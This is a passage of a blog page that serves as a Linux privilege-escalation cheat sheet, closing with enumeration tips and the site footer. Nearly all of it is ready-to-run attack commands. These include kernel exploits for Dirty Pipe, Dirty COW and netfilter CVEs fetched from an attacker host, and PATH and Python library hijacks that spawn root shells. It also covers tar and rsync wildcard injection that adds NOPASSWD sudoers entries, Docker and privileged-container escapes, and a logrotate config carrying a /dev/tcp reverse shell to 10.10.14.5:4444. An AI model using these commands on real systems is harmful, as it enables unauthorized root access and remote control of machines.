+<h3 id="Dirty-Pipe-CVE-2022-0847"><a href="#Dirty-Pipe-CVE-2022-0847" class="headerlink" title="Dirty Pipe (CVE-2022-0847)"></a>Dirty Pipe (CVE-2022-0847)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Affects kernels 5.8 to 5.17</span></span><br><span class="line"><span class="comment"># Check version</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download exploit</span></span><br><span class="line">wget http://10.10.14.5/dirtypipe.c</span><br><span class="line">gcc dirtypipe.c -o dirtypipe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit SUID binary (e.g., /usr/bin/su)</span></span><br><span class="line">./dirtypipe /usr/bin/su</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dirty-COW-CVE-2016-5195"><a href="#Dirty-COW-CVE-2016-5195" class="headerlink" title="Dirty COW (CVE-2016-5195)"></a>Dirty COW (CVE-2016-5195)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Affects kernels 2.6.22 to 4.8.3</span></span><br><span class="line">wget http://10.10.14.5/dirtycow.c</span><br><span class="line">gcc -pthread dirtycow.c -o dirtycow -lcrypt</span><br><span class="line">./dirtycow</span><br></pre></td></tr></table></figure>
+
+<h3 id="Netfilter-Exploits"><a href="#Netfilter-Exploits" class="headerlink" title="Netfilter Exploits"></a>Netfilter Exploits</h3><h4 id="CVE-2021-22555"><a href="#CVE-2021-22555" class="headerlink" title="CVE-2021-22555"></a>CVE-2021-22555</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Affects kernels 2.6 to 5.11</span></span><br><span class="line">wget http://10.10.14.5/cve-2021-22555.c</span><br><span class="line">gcc -m32 -static cve-2021-22555.c -o exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2022-25636"><a href="#CVE-2022-25636" class="headerlink" title="CVE-2022-25636"></a>CVE-2022-25636</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Affects kernels 5.4 to 5.6.10</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Bonfee/CVE-2022-25636.git</span><br><span class="line"><span class="built_in">cd</span> CVE-2022-25636</span><br><span class="line">make</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2023-32233"><a href="#CVE-2023-32233" class="headerlink" title="CVE-2023-32233"></a>CVE-2023-32233</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Affects kernels up to 6.3.1</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Liuk3r/CVE-2023-32233</span><br><span class="line"><span class="built_in">cd</span> CVE-2023-32233</span><br><span class="line">gcc -Wall -o exploit exploit.c -lmnl -lnftnl</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<h2 id="PATH-Hijacking"><a href="#PATH-Hijacking" class="headerlink" title="PATH Hijacking"></a>PATH Hijacking</h2><h3 id="Check-PATH-Variable"><a href="#Check-PATH-Variable" class="headerlink" title="Check PATH Variable"></a>Check PATH Variable</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If PATH contains writable directory or current directory (.)</span></span><br><span class="line"><span class="comment"># Create malicious binary with common name</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /tmp/ls &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">/bin/bash -p</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># If /tmp is in PATH before /bin</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">ls</span>  <span class="comment"># Executes malicious /tmp/ls</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Hijack-Binary-in-Sudo-Context"><a href="#Hijack-Binary-in-Sudo-Context" class="headerlink" title="Hijack Binary in Sudo Context"></a>Hijack Binary in Sudo Context</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If sudo -l shows a script that calls binaries without full path</span></span><br><span class="line"><span class="comment"># Example: sudo /usr/local/bin/backup.sh (which calls &quot;tar&quot;)</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /tmp/tar &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">/bin/bash -p</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/tar</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="NFS-Root-Squashing"><a href="#NFS-Root-Squashing" class="headerlink" title="NFS Root Squashing"></a>NFS Root Squashing</h2><h3 id="Check-NFS-Exports"><a href="#Check-NFS-Exports" class="headerlink" title="Check NFS Exports"></a>Check NFS Exports</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On target</span></span><br><span class="line"><span class="built_in">cat</span> /etc/exports</span><br><span class="line">showmount -e localhost</span><br><span class="line"></span><br><span class="line"><span class="comment"># Look for no_root_squash option</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploit-no-root-squash"><a href="#Exploit-no-root-squash" class="headerlink" title="Exploit no_root_squash"></a>Exploit no_root_squash</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On attacker machine (as root)</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/nfs</span><br><span class="line">mount -t nfs target:/share /tmp/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create SUID binary</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/nfs/bash</span><br><span class="line"><span class="built_in">chmod</span> +s /tmp/nfs/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># On target</span></span><br><span class="line">/share/bash -p</span><br></pre></td></tr></table></figure>
+
+<h2 id="Wildcard-Injection"><a href="#Wildcard-Injection" class="headerlink" title="Wildcard Injection"></a>Wildcard Injection</h2><h3 id="Tar-Wildcard-Exploitation-1"><a href="#Tar-Wildcard-Exploitation-1" class="headerlink" title="Tar Wildcard Exploitation"></a>Tar Wildcard Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If script uses: tar -czf backup.tar.gz *</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;echo &quot;user ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; privesc.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint=1&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh privesc.sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Rsync-Wildcard-Exploitation"><a href="#Rsync-Wildcard-Exploitation" class="headerlink" title="Rsync Wildcard Exploitation"></a>Rsync Wildcard Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If script uses: rsync -a * /backup/</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;user ALL=(ALL) NOPASSWD: ALL&quot;</span> &gt; exploit</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;-e sh exploit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Container-Escape"><a href="#Container-Escape" class="headerlink" title="Container Escape"></a>Container Escape</h2><h3 id="Check-if-Inside-Container"><a href="#Check-if-Inside-Container" class="headerlink" title="Check if Inside Container"></a>Check if Inside Container</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check for container indicators</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">ls</span> -la /.dockerenv</span><br><span class="line"><span class="built_in">cat</span> /proc/self/mountinfo | grep docker</span><br></pre></td></tr></table></figure>
+
+<h3 id="Docker-Socket-Escape"><a href="#Docker-Socket-Escape" class="headerlink" title="Docker Socket Escape"></a>Docker Socket Escape</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If /var/run/docker.sock is accessible</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -v /:/mnt --<span class="built_in">rm</span> -it ubuntu <span class="built_in">chroot</span> /mnt bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="Privileged-Container-Escape"><a href="#Privileged-Container-Escape" class="headerlink" title="Privileged Container Escape"></a>Privileged Container Escape</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check if container is privileged</span></span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If privileged, access host devices</span></span><br><span class="line">fdisk -l</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/host</span><br><span class="line">mount /dev/sda1 /mnt/host</span><br><span class="line"><span class="built_in">chroot</span> /mnt/host</span><br></pre></td></tr></table></figure>
+
+<h2 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h2><h3 id="Tmux-Screen-Session-Hijacking"><a href="#Tmux-Screen-Session-Hijacking" class="headerlink" title="Tmux&#x2F;Screen Session Hijacking"></a>Tmux&#x2F;Screen Session Hijacking</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># List tmux sessions</span></span><br><span class="line">tmux <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to session</span></span><br><span class="line">tmux attach -t &lt;session&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># List screen sessions</span></span><br><span class="line">screen -<span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to screen session</span></span><br><span class="line">screen -x &lt;session&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Python-Library-Hijacking"><a href="#Python-Library-Hijacking" class="headerlink" title="Python Library Hijacking"></a>Python Library Hijacking</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If script runs as root and imports from writable directory</span></span><br><span class="line"><span class="comment"># Check PYTHONPATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PYTHONPATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create malicious module</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /tmp/exploit.py &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">os.setuid(0)</span></span><br><span class="line"><span class="string">os.system(&quot;/bin/bash -p&quot;)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If script imports &quot;exploit&quot;</span></span><br><span class="line"><span class="built_in">export</span> PYTHONPATH=/tmp:<span class="variable">$PYTHONPATH</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Logrotate-Exploitation"><a href="#Logrotate-Exploitation" class="headerlink" title="Logrotate Exploitation"></a>Logrotate Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If logrotate runs as root with writable config</span></span><br><span class="line"><span class="comment"># Create malicious logrotate config</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/logrotate.d/exploit &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">/tmp/dummy.log &#123;</span></span><br><span class="line"><span class="string">    daily</span></span><br><span class="line"><span class="string">    rotate 1</span></span><br><span class="line"><span class="string">    create 0644 root root</span></span><br><span class="line"><span class="string">    postrotate</span></span><br><span class="line"><span class="string">        /bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&#x27;</span></span><br><span class="line"><span class="string">    endscript</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create dummy log</span></span><br><span class="line"><span class="built_in">touch</span> /tmp/dummy.log</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>Enumeration is Key:</strong></p>
+<ul>
+<li>Spend time on thorough enumeration before attempting exploits</li>
+<li>Automated tools like LinPEAS can miss context-specific misconfigurations</li>
+<li>Always check sudo -l, SUID binaries, cron jobs, and file permissions</li>
+</ul>
+<p><strong>SUID&#x2F;SGID Binaries:</strong></p>
+<ul>
+<li>Not all SUID binaries are exploitable</li>
+<li>Cross-reference findings with GTFOBins for exploitation techniques</li>
+<li>Custom SUID binaries are often more vulnerable than system binaries</li>
+</ul>
+<p><strong>Kernel Exploits:</strong></p>
+<ul>
+<li>Use as last resort due to system crash risk</li>
+<li>Always check kernel version and patch level first</li>
+<li>Test in lab environment before production use</li>
+</ul>
+<p><strong>Sudo Abuse:</strong></p>
+<ul>
+<li>Even seemingly harmless binaries can be abused (find, vim, less, more, etc.)</li>
+<li>LD_PRELOAD is a powerful technique when env_keep is set</li>
+<li>Check for sudo version vulnerabilities (Baron Samedit, etc.)</li>
+</ul>
+<p><strong>Privileged Groups:</strong></p>
+<ul>
+<li>Docker, LXD, disk, and adm groups provide easy privilege escalation paths</li>
+<li>Always check group memberships with <code>id</code> command</li>
+<li>Container escapes are often simpler than kernel exploits</li>
+</ul>
+<p><strong>Credentials:</strong></p>
+<ul>
+<li>Check history files, config files, backup files, and environment variables</li>
+<li>Database credentials are often stored in web application configs</li>
+<li>SSH keys may be readable or writable</li>
+</ul>
+<p><strong>Cron Jobs:</strong></p>
+<ul>
+<li>Monitor with pspy to see what runs and when</li>
+<li>Check for writable scripts or directories in cron paths</li>
+<li>Wildcard injection in tar&#x2F;rsync commands is common</li>
+</ul>
+<p><strong>PATH Hijacking:</strong></p>
+<ul>
+<li>Works when scripts call binaries without absolute paths</li>
+<li>Requires writable directory in PATH before legitimate binary location</li>
+<li>Particularly effective with sudo if env_keep includes PATH</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
